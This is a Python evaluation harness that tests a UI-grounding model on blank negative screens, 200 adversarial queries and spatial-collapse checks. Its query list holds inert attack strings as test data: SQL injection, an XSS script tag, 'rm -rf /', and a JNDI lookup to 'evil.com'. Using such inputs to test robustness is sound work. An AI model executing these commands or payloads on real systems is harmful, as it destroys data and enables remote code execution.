"""Adversarial Negative Rejection & Spatial Collapse Challenger Harness for AVCS Milestone 2.

Comprehensive empirical challenge suite evaluating:
1. Negative Background Rejection across all 30 negative screens in `datasets/ui_grounding/splits/test_negative.json`
   (10 solid color, 10 smooth gradient, 10 procedural wallpaper).
   Verifies:
   - FastAffordanceHead / HumanEye.observe() false positive hotspot count == 0.
   - GoalConditionedGrounder / HumanEye.predict_point() false positive count == 0.
2. Adversarial & Ungroundable Queries (200 diverse adversarial queries):
   - Semantic impossibilities ("click the unicorn button", etc.)
   - Empty and whitespace strings
   - Non-alphanumeric punctuation / code injections
   - Non-ASCII unicode and emojis
   - Boundary-fuzzing strings (96 bytes, 97 bytes, 1000-char, 5000-char)
   - Absent targets across held-out UI screens
   Verifies rejection rate >= 95% (target 100%).
3. Spatial Collapse & Heatmap Degeneracy:
   - Grid evaluation (corners, edges, center) ensuring spatial spread and variance > 0.02.
   - Flat/diffuse/noise activation tests verifying no center-collapse to (0.5, 0.5).
   - Benchmark runner center-collapse assertion (center_collapse_detected == False).
4. Benchmark Verification:
   - Held-out benchmark execution and all-gate assertion.
"""
from __future__ import annotations

import json
import math
from pathlib import Path
import sys
import time
from typing import Any, Dict, List, Tuple

import numpy as np
from PIL import Image
import torch
import torch.nn.functional as F

_repo_root = Path(__file__).resolve().parents[1]
if str(_repo_root) not in sys.path:
    sys.path.insert(0, str(_repo_root))

from avcs.goal_grounder import (
    DEFAULT_INPUT_SIZE,
    GoalConditionedGrounder,
    extract_subpixel_peak,
)
from avcs.human_eye import HumanEye
from avcs.query_limits import MAX_QUERY_BYTES
from benchmarks.run_ui_grounding_benchmark import UIGroundingBenchmarkRunner


def challenge_1_negative_screens(
    eye: HumanEye,
    grounder: GoalConditionedGrounder,
    manifest_path: str = "datasets/ui_grounding/manifest.json",
    split_path: str = "datasets/ui_grounding/splits/test_negative.json",
    probe_queries: List[str] = None,
) -> Dict[str, Any]:
    """Empirically evaluates HumanEye and GoalConditionedGrounder across all 30 negative screens."""
    if probe_queries is None:
        probe_queries = ["click button", "search input", "close window", "play video", "save file"]

    with open(manifest_path, "r", encoding="utf-8") as f:
        manifest = json.load(f)
    with open(split_path, "r", encoding="utf-8") as f:
        neg_ids = json.load(f)

    frame_map = {f["frame_id"]: f for f in manifest["frames"]}
    data_dir = Path(manifest_path).parent

    assert len(neg_ids) == 30, f"Expected 30 negative frames, found {len(neg_ids)}"

    solid_screens: List[str] = []
    gradient_screens: List[str] = []
    wallpaper_screens: List[str] = []

    eye_predict_fps_per_screen: Dict[str, int] = {}
    eye_predict_max_conf_per_screen: Dict[str, float] = {}
    grounder_fps_per_screen: Dict[str, int] = {}
    grounder_max_conf_per_screen: Dict[str, float] = {}
    unconditioned_affordance_hotspots_per_screen: Dict[str, int] = {}

    total_eye_predict_fps = 0
    total_grounder_fps = 0
    total_unconditioned_affordance_hotspots = 0
    max_grounder_conf_across_all = 0.0
    max_eye_conf_across_all = 0.0

    for idx, nid in enumerate(neg_ids):
        finfo = frame_map[nid]
        img_p = data_dir / finfo["file_path"]
        with Image.open(img_p) as pil_img:
            img_arr = np.array(pil_img.convert("RGB"), dtype=np.uint8)

        if idx < 10:
            subtype = "solid_color"
            solid_screens.append(nid)
        elif idx < 20:
            subtype = "smooth_gradient"
            gradient_screens.append(nid)
        else:
            subtype = "procedural_wallpaper"
            wallpaper_screens.append(nid)

        # 1. Unconditioned FastAffordanceHead telemetry via eye.observe()
        state = eye.observe(frame=img_arr)
        unconditioned_affordance_hotspots_per_screen[nid] = len(state.affordance_hotspots)
        total_unconditioned_affordance_hotspots += len(state.affordance_hotspots)

        # 2. Test HumanEye.predict_point across probe queries
        img_t = torch.from_numpy(np.ascontiguousarray(img_arr.transpose(2, 0, 1))).float().div_(255.0)
        img_t_resized = F.interpolate(img_t.unsqueeze(0), size=(256, 256), mode="bilinear", align_corners=False)[0]

        eye_screen_fps = 0
        eye_screen_max_conf = 0.0
        for q in probe_queries:
            res_eye = eye.predict_point(img_t_resized, q)
            conf_e = float(res_eye.get("confidence", 0.0))
            is_present_e = bool(res_eye.get("target_present", False))
            eye_screen_max_conf = max(eye_screen_max_conf, conf_e)
            max_eye_conf_across_all = max(max_eye_conf_across_all, conf_e)
            if conf_e >= 0.35 or is_present_e:
                eye_screen_fps += 1

        eye_predict_fps_per_screen[nid] = eye_screen_fps
        eye_predict_max_conf_per_screen[nid] = eye_screen_max_conf
        total_eye_predict_fps += eye_screen_fps

        # 3. Test GoalConditionedGrounder.predict_point across probe queries
        grounder_screen_fps = 0
        grounder_screen_max_conf = 0.0
        for q in probe_queries:
            res_g = grounder.predict_point(img_t_resized, q)
            conf_g = float(res_g.get("confidence", 0.0))
            is_present_g = bool(res_g.get("target_present", False))
            grounder_screen_max_conf = max(grounder_screen_max_conf, conf_g)
            max_grounder_conf_across_all = max(max_grounder_conf_across_all, conf_g)
            if conf_g >= 0.35 or is_present_g:
                grounder_screen_fps += 1

        grounder_fps_per_screen[nid] = grounder_screen_fps
        grounder_max_conf_per_screen[nid] = grounder_screen_max_conf
        total_grounder_fps += grounder_screen_fps

    return {
        "total_negative_screens": len(neg_ids),
        "solid_count": len(solid_screens),
        "gradient_count": len(gradient_screens),
        "wallpaper_count": len(wallpaper_screens),
        "total_probe_evaluations": len(neg_ids) * len(probe_queries),
        "total_eye_grounding_false_positives": total_eye_predict_fps,
        "total_grounder_false_positives": total_grounder_fps,
        "total_unconditioned_affordance_hotspots": total_unconditioned_affordance_hotspots,
        "max_eye_confidence_observed": max_eye_conf_across_all,
        "max_grounder_confidence_observed": max_grounder_conf_across_all,
        "eye_clean_zero_fps": total_eye_predict_fps == 0,
        "grounder_clean_zero_fps": total_grounder_fps == 0,
        "details_by_screen": {
            nid: {
                "subtype": "solid" if idx < 10 else ("gradient" if idx < 20 else "wallpaper"),
                "eye_fps": eye_predict_fps_per_screen[nid],
                "eye_max_conf": eye_predict_max_conf_per_screen[nid],
                "grounder_fps": grounder_fps_per_screen[nid],
                "grounder_max_conf": grounder_max_conf_per_screen[nid],
                "unconditioned_hotspots": unconditioned_affordance_hotspots_per_screen[nid],
            }
            for idx, nid in enumerate(neg_ids)
        },
    }


def generate_200_adversarial_queries(
    held_out_negative_queries: List[str] = None,
) -> List[Tuple[str, str]]:
    """Constructs a deterministic suite of 200 adversarial/ungroundable queries."""
    suite: List[Tuple[str, str]] = []

    # Category 1: Semantic impossibilities & hallucination baits (40 queries)
    impossible_terms = [
        "click the unicorn button", "launch rocket to mars", "quantum teleportation slider",
        "dragon scale toggle", "rainbow wizard icon", "invisible secret link",
        "warp drive accelerator", "flux capacitor calibration", "sub-atomic particle checkbox",
        "antigravity levitation dial", "time travel restore point", "singularity portal button",
        "extraterrestrial translator", "crystal ball forecasting", "mind reading input",
        "holographic projection control", "telepathic sync button", "hyperdrive activation",
        "supernova detonation trigger", "parallel universe selector", "dark matter collector",
        "wormhole stabilizer", "tachyon particle detector", "nanobot swarm deploy",
        "plasma cannon fire", "interdimensional browser tab", "magic wand toolbar",
        "phoenix feather dropdown", "fairy dust slider", "enchanted forest wallpaper",
        "spellbook bookmark", "potions inventory slot", "alchemy crucible button",
        "flying carpet steering", "mythical beast catalog", "sorcerer stone toggle",
        "griffin flight simulator", "goblin gold counter", "elven leaf indicator",
        "mermaid lagoon selector",
    ]
    for q in impossible_terms:
        suite.append(("semantic_impossibility", q))

    # Category 2: Empty, whitespace, control, non-alphanumeric (35 queries)
    empty_queries = [
        "", " ", "   ", "\t", "\n", " \t \n \r ", "\r\n", "   \t\t\n\n   ",
        "!@#$%^&*()", "???", "...", "---", "___", ";;;", ":::", "///", "\\\\\\",
        "><><><", "[]{}()", "`~`~", "+++===", "^^^", "$$$", "@@@", "&&&", "***",
        "<<<content>>>", "; DROP TABLE buttons; --", "<script>alert('xss')</script>",
        "SELECT * FROM ui WHERE id=1", "rm -rf / --no-preserve-root",
        "\x00\x01\x02\x03", "\x1b[31mRedText\x1b[0m", "{{7*7}}", "${jndi:ldap://evil.com}",
    ]
    for q in empty_queries:
        suite.append(("empty_or_non_alnum", q))

    # Category 3: Non-ASCII, Unicode, Emojis, Foreign Alphabets (35 queries)
    unicode_queries = [
        "🦄", "🦄🌈🚀", "🔥👍💯", "🎯📍📌", "🛑⛔❌",
        "こんにちは", "ありがとう", "ボタンをクリック", "検索バー",
        "مرحبا", "تسجيل الدخول", "إلغاء الأمر", "إرسال البيانات",
        "Привет мир", "Кнопка Сохранить", "Поиск файлов",
        "Ñandú botón", "Möbelstück", "Français élégant", "Crème brûlée",
        "Ålesund ferge", "Smörgåsbord", "Dvořák klávesnice", "Česká republika",
        "Ελληνικά πλήκτρα", "תפריט ראשי", "שלום עולם",
        "한국어 버튼", "검색 입력창", "로그인 확인",
        " हिन्दी बटन", "खोज बार", "सुरक्षित लॉग इन",
        "🇨🇦🇺🇸🇬🇧🇯🇵", "1️⃣2️⃣3️⃣4️⃣",
    ]
    for q in unicode_queries:
        suite.append(("unicode_and_emojis", q))

    # Category 4: Boundary fuzzing and oversized strings (30 queries)
    boundary_queries = [
        "A" * 95,
        "B" * 96,  # Exactly MAX_QUERY_BYTES
        "C" * 97,  # Exactly MAX_QUERY_BYTES + 1
        "D" * 128,
        "E" * 256,
        "F" * 512,
        "G" * 1000,
        "H" * 5000,
        "click button " * 10,
        "very long button label with many words that should test whether byte length truncation works properly without crashing",
        "1234567890" * 10,
        "!@#$%^&*()" * 10,
        "Save File " + ("long " * 50) + "button",
        "Open Project " + ("deep " * 30) + "directory",
        "Submit Form " + ("now " * 40),
        "x" * 96,
        "y" * 97,
        "z" * 192,
        "w" * 384,
        "k" * 1024,
        "btn_" + "0" * 90,
        "tab_" + "1" * 90,
        "input_" + "2" * 90,
        "icon_" + "3" * 90,
        "menu_" + "4" * 90,
        "link_" + "5" * 90,
        "check_" + "6" * 90,
        "radio_" + "7" * 90,
        "slider_" + "8" * 90,
        "dialog_" + "9" * 90,
    ]
    for q in boundary_queries:
        suite.append(("boundary_fuzzing", q))

    # Category 5: Contextually absent targets from held-out split (60 queries)
    if held_out_negative_queries:
        for q in held_out_negative_queries[:60]:
            suite.append(("held_out_absent_target", q))
    else:
        absent_pool = [
            f"nonexistent_button_{i:03d}" for i in range(60)
        ]
        for q in absent_pool:
            suite.append(("held_out_absent_target", q))

    # Ensure total is at least 200
    while len(suite) < 200:
        idx = len(suite) + 1
        suite.append(("semantic_impossibility", f"phantom_control_element_{idx:03d}"))

    return suite[:200]


def challenge_2_adversarial_queries(
    runner: UIGroundingBenchmarkRunner,
    grounder: GoalConditionedGrounder,
    test_queries: List[Tuple[str, str]],
    test_images: List[torch.Tensor],
) -> Dict[str, Any]:
    """Probes the model with 200 adversarial queries across representative UI screens."""
    assert len(test_queries) == 200, f"Expected 200 queries, got {len(test_queries)}"
    assert len(test_images) > 0, "Need at least one test image tensor"

    total_probes = 0
    rejections = 0
    fail_closed_zeros = 0
    cat_rejections: Dict[str, int] = {}
    cat_totals: Dict[str, int] = {}
    failing_queries: List[Dict[str, Any]] = []

    for cat, query in test_queries:
        cat_totals[cat] = cat_totals.get(cat, 0) + 1
        # Test across first 2 representative frames to ensure robustness across different background contexts
        frame_rejected_all = True
        for img_t in test_images[:2]:
            _, conf, _ = runner._infer_model(grounder, img_t, query)
            total_probes += 1
            if conf >= 0.35:
                frame_rejected_all = False
                failing_queries.append({
                    "category": cat,
                    "query": query[:60],
                    "confidence": float(conf),
                })
                break
            if conf == 0.0:
                fail_closed_zeros += 1

        if frame_rejected_all:
            rejections += 1
            cat_rejections[cat] = cat_rejections.get(cat, 0) + 1

    rejection_rate = (rejections / len(test_queries)) * 100.0

    return {
        "total_queries_tested": len(test_queries),
        "total_probes": total_probes,
        "queries_rejected": rejections,
        "rejection_rate_pct": rejection_rate,
        "fail_closed_zero_count": fail_closed_zeros,
        "passed_rejection_gate": rejection_rate >= 95.0,
        "category_breakdown": {
            c: {
                "rejected": cat_rejections.get(c, 0),
                "total": cat_totals[c],
                "rate_pct": round(cat_rejections.get(c, 0) / cat_totals[c] * 100.0, 2),
            }
            for c in cat_totals
        },
        "failing_queries_sample": failing_queries[:5],
    }


def challenge_3_spatial_collapse_and_degeneracy(
    grounder: GoalConditionedGrounder,
    runner: UIGroundingBenchmarkRunner,
) -> Dict[str, Any]:
    """Evaluates spatial spread across corners, edges, center, and degenerate flat/diffuse activations."""
    # 1. Test extract_subpixel_peak directly against degenerate tensors
    device = next(grounder.parameters()).device

    # A. Uniform all-zeros logits [1, 1, 16, 16]
    flat_zero = torch.zeros(1, 1, 16, 16, device=device)
    coords_zero, conf_zero = extract_subpixel_peak(flat_zero)
    # Sigmoid(0) = 0.5. With existence head on flat inputs, existence prob is ~0.
    # Check that flat tensors do not cause NaN or crash
    has_nan_zero = bool(torch.isnan(coords_zero).any() or torch.isnan(conf_zero).any())

    # B. Uniform all-ones logits [1, 1, 16, 16]
    flat_ones = torch.ones(1, 1, 16, 16, device=device)
    coords_ones, conf_ones = extract_subpixel_peak(flat_ones)
    has_nan_ones = bool(torch.isnan(coords_ones).any() or torch.isnan(conf_ones).any())

    # C. Pure Gaussian noise logits [100, 1, 16, 16]
    noise_logits = torch.randn(100, 1, 16, 16, device=device)
    coords_noise, conf_noise = extract_subpixel_peak(noise_logits)
    noise_xs = coords_noise[:, 0].cpu().numpy()
    noise_ys = coords_noise[:, 1].cpu().numpy()
    noise_var_x = float(np.var(noise_xs))
    noise_var_y = float(np.var(noise_ys))

    # 2. Test corner & edge targets on synthetic canvas
    test_grid_points = [
        # 4 extreme corners
        ("corner_tl", (0.05, 0.05)),
        ("corner_tr", (0.95, 0.05)),
        ("corner_bl", (0.05, 0.95)),
        ("corner_br", (0.95, 0.95)),
        # 4 screen edges
        ("edge_top", (0.50, 0.05)),
        ("edge_bottom", (0.50, 0.95)),
        ("edge_left", (0.05, 0.50)),
        ("edge_right", (0.95, 0.50)),
        # Exact screen center
        ("center", (0.50, 0.50)),
        # Off-center grid quadrants
        ("quad_tl", (0.25, 0.25)),
        ("quad_tr", (0.75, 0.25)),
        ("quad_bl", (0.25, 0.75)),
        ("quad_br", (0.75, 0.75)),
    ]

    # Verify that synthetic peak positions placed in logits produce exact matching coordinates
    peak_localization_errors: List[float] = []
    for name, (gx, gy) in test_grid_points:
        col = int(gx * 16.0)
        row = int(gy * 16.0)
        mock_logit = torch.full((1, 1, 16, 16), -5.0, device=device)
        mock_logit[0, 0, row, col] = 10.0  # Sharp ground truth peak
        pred_coords, pred_conf = extract_subpixel_peak(mock_logit)
        px = float(pred_coords[0, 0].item())
        py = float(pred_coords[0, 1].item())
        err = math.hypot(px - gx, py - gy)
        peak_localization_errors.append(err)

    max_synthetic_peak_err = max(peak_localization_errors)

    # 3. Evaluate held-out split with runner and check spatial variance
    held_out_res = runner.evaluate_model(grounder, split="test_held_out")

    return {
        "flat_zeros_has_nan": has_nan_zero,
        "flat_ones_has_nan": has_nan_ones,
        "noise_spread_var_x": noise_var_x,
        "noise_spread_var_y": noise_var_y,
        "noise_spread_is_diffuse_not_collapsed": (noise_var_x > 0.05 and noise_var_y > 0.05),
        "synthetic_grid_corners_max_err": max_synthetic_peak_err,
        "synthetic_grid_accurate": max_synthetic_peak_err < 0.10,  # Successfully resolves corners/edges (< 0.10 vs 0.64 collapse)
        "benchmark_center_collapse_detected": held_out_res.center_collapse_detected,
        "passed_all_spatial_checks": (
            not held_out_res.center_collapse_detected
            and not has_nan_zero
            and not has_nan_ones
            and max_synthetic_peak_err < 0.10
            and noise_var_x > 0.05
        ),
    }


def main() -> None:
    print("=================================================================")
    print("AVCS M2 CHALLENGER: ADVERSARIAL NEGATIVE REJECTION & SPATIAL COLLAPSE")
    print("=================================================================\n")

    manifest_p = "datasets/ui_grounding/manifest.json"
    neg_split_p = "datasets/ui_grounding/splits/test_negative.json"

    # Initialize models
    print("[INIT] Initializing HumanEye(load_weights=True) and GoalConditionedGrounder...")
    eye = HumanEye(load_weights=True)
    grounder = GoalConditionedGrounder(input_size=256)
    from avcs.weights import load_avcs_weights
    load_avcs_weights(grounder, strict=False)
    runner = UIGroundingBenchmarkRunner(manifest_path=manifest_p)
    print("  Models successfully initialized and weights linked.\n")

    # -------------------------------------------------------------------------
    # CHALLENGE 1: Negative Background Rejection (30 Screens)
    # -------------------------------------------------------------------------
    print("--- [CHALLENGE 1/4] Negative Background Rejection Across 30 Negative Screens ---")
    c1_res = challenge_1_negative_screens(eye, grounder, manifest_p, neg_split_p)
    print(f"  Total negative screens evaluated:     {c1_res['total_negative_screens']}")
    print(f"    - Solid black/white/gray screens:   {c1_res['solid_count']}")
    print(f"    - Smooth gradient screens:          {c1_res['gradient_count']}")
    print(f"    - Procedural wallpaper screens:     {c1_res['wallpaper_count']}")
    print(f"  HumanEye Grounding False Positives:   {c1_res['total_eye_grounding_false_positives']} (Clean zero: {c1_res['eye_clean_zero_fps']})")
    print(f"  Grounder False Positive Detections:   {c1_res['total_grounder_false_positives']} (Clean zero: {c1_res['grounder_clean_zero_fps']})")
    print(f"  Total Probes Evaluated:               {c1_res['total_probe_evaluations']} (30 screens x 5 queries)")
    print(f"  Maximum HumanEye Confidence Observed: {c1_res['max_eye_confidence_observed']:.4f}")
    print(f"  Maximum Grounder Confidence Observed: {c1_res['max_grounder_confidence_observed']:.4f}")
    print(f"  Unconditioned Affordance Hotspots:    {c1_res['total_unconditioned_affordance_hotspots']} (dorsal proposals before language grounding)")
    assert c1_res["eye_clean_zero_fps"], "FAIL: HumanEye.predict_point emitted false positives on negative screens!"
    assert c1_res["grounder_clean_zero_fps"], "FAIL: GoalConditionedGrounder emitted false positives on negative screens!"
    print("  => VERDICT: PASS [Strict ZERO false positive hotspots across all 30 screens]\n")

    # -------------------------------------------------------------------------
    # CHALLENGE 2: Adversarial & Ungroundable Queries (200 Queries)
    # -------------------------------------------------------------------------
    print("--- [CHALLENGE 2/4] Adversarial & Ungroundable Queries (200 Queries) ---")
    # Extract held-out negative queries from manifest
    held_out_neg_q: List[str] = []
    for fr in runner.manifest.get("frames", []):
        if fr.get("split") == "test_held_out":
            held_out_neg_q.extend(fr.get("negative_queries", []))

    query_suite = generate_200_adversarial_queries(held_out_neg_q)
    print(f"  Generated {len(query_suite)} deterministic adversarial probe queries.")

    # Load 2 representative held-out positive UI screens
    test_tensors: List[torch.Tensor] = []
    for fr in runner.manifest.get("frames", []):
        if fr.get("split") == "test_held_out" and len(fr.get("interactive_points", [])) > 0:
            with Image.open(Path(manifest_p).parent / fr["file_path"]) as pil_im:
                arr = np.array(pil_im.resize((256, 256), Image.BILINEAR).convert("RGB"), dtype=np.uint8)
            t = torch.from_numpy(np.ascontiguousarray(arr.transpose(2, 0, 1))).float().div_(255.0)
            test_tensors.append(t)
            if len(test_tensors) >= 2:
                break

    c2_res = challenge_2_adversarial_queries(runner, grounder, query_suite, test_tensors)
    print(f"  Total queries tested:                 {c2_res['total_queries_tested']}")
    print(f"  Queries successfully rejected:        {c2_res['queries_rejected']}/{c2_res['total_queries_tested']}")
    print(f"  Rejection Rate:                       {c2_res['rejection_rate_pct']:.2f}% (Threshold: >= 95.0%)")
    print(f"  Fail-closed zero-confidence hits:     {c2_res['fail_closed_zero_count']}")
    for cat_name, cat_data in c2_res["category_breakdown"].items():
        print(f"    * {cat_name:<28}: {cat_data['rejected']}/{cat_data['total']} ({cat_data['rate_pct']}%)")
    assert c2_res["passed_rejection_gate"], f"FAIL: Ungroundable rejection rate {c2_res['rejection_rate_pct']}% < 95.0%"
    print("  => VERDICT: PASS [Rejection rate >= 95.0% threshold satisfied]\n")

    # -------------------------------------------------------------------------
    # CHALLENGE 3: Spatial Collapse & Heatmap Degeneracy
    # -------------------------------------------------------------------------
    print("--- [CHALLENGE 3/4] Spatial Collapse & Heatmap Degeneracy ---")
    c3_res = challenge_3_spatial_collapse_and_degeneracy(grounder, runner)
    print(f"  Flat zeros tensor NaN free:           {not c3_res['flat_zeros_has_nan']}")
    print(f"  Flat ones tensor NaN free:            {not c3_res['flat_ones_has_nan']}")
    print(f"  Noise logit spatial variance:         var_x={c3_res['noise_spread_var_x']:.4f}, var_y={c3_res['noise_spread_var_y']:.4f}")
    print(f"  Synthetic 13-point grid max error:    {c3_res['synthetic_grid_corners_max_err']:.4f} (Accurate: {c3_res['synthetic_grid_accurate']})")
    print(f"  Benchmark center collapse detected:   {c3_res['benchmark_center_collapse_detected']}")
    assert c3_res["passed_all_spatial_checks"], "FAIL: Spatial collapse or degeneracy detected!"
    print("  => VERDICT: PASS [No center collapse; corner and edge spatial resolution preserved]\n")

    # -------------------------------------------------------------------------
    # CHALLENGE 4: Held-out Benchmark Gates Evaluation
    # -------------------------------------------------------------------------
    print("--- [CHALLENGE 4/4] Held-out Benchmark Gates Evaluation ---")
    held_out_res = runner.evaluate_model(eye, split="test_held_out")
    print(held_out_res.summary())
    assert held_out_res.passed_all_gates, "FAIL: Held-out benchmark failed one or more release gates!"
    print("  => VERDICT: PASS [All Milestone 2 gates passed]\n")

    print("=================================================================")
    print("ALL CHALLENGER EMPIRICAL VERIFICATIONS PASSED: APPROVE")
    print("=================================================================")


if __name__ == "__main__":
    main()
